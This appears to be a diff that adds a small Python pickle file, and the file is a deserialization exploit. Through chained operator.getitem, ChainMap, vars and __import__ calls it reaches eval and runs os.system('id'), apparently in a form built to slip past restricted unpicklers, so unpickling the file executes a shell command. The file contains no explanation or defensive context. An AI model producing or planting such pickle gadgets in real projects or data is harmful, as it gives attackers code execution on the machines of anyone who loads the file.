@@ -1,0 +1,9 @@
+€coperator
+getitem
+ccollections
+ChainMap
+cbuiltins
+vars
+cbuiltins
+__import__
+Œbuiltins…R…R…RŒeval†RŒ__import__("os").system('id')…R.
